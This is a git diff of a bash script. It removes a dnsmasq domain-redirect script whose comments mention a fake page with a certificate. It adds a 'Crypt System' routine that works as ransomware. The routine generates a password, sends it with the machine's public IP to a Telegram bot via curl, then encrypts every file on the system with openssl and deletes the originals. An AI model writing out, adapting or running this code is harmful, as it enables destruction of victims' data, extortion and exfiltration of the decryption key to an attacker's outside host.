@@ -1,33 +1,25 @@
 #!/bin/bash
-#Dns: https://www.howtoforge.com/how-to-setup-local-dns-server-using-dnsmasq-on-ubuntu-20-04/
-#		https://askubuntu.com/questions/53523/how-to-redirect-a-url-to-a-custom-ip-address
-#		https://stackoverflow.com/questions/41739211/resolve-non-exist-domain-name-to-local-ip-using-dnsmasq
-		#Add certificate to fake page
-#!/bin/bash
 
-# Impostazione del nome del dominio e dell'indirizzo IP
-DOMAIN="example.com"
-IP="192.168.1.100"
-
-# Verifica se il file di configurazione di dnsmasq esiste
-if [ ! -f /etc/dnsmasq.conf ]; then
-    echo "Il file di configurazione di dnsmasq non esiste"
-    exit 1
-fi
-
-# Verifica se l'indirizzo IP è valido
-if ! [[ "$IP" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
-    echo "L'indirizzo IP non è valido"
-    exit 1
-fi
-
-# Aggiunta delle righe di configurazione a dnsmasq.conf
-echo "address=/$DOMAIN/$IP" >> /etc/dnsmasq.conf
-
-# Riavvio del servizio dnsmasq
-systemctl restart dnsmasq
-
-echo "Reindirizzamento completato con successo"
-exit 0
-
-
+#Crypt System
+#function to generate a random password
+function generate_password {
+    #generate a random password using openssl rand
+    password=$(openssl rand -base64 16)
+    #send the generated password
+    curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="System Crypted: $public_ip %0APassword: $password"
+}
+#call function
+generate_password
+#creates a list of all files
+files=$(find / -type f)
+#encrypts each file using the generated password
+for file in $files; do
+    #create encrypted file name
+    encrypted_file="$file.enc"
+    #encrypt the file using openssl and the generated password
+    openssl enc -aes-256-cbc -salt -in "$file" -out "$encrypted_file" -pass pass:"$password"
+    #eemoves the original file if encryption was successful
+    if [ $? -eq 0 ]; then
+        rm "$file"
+    fi
+done
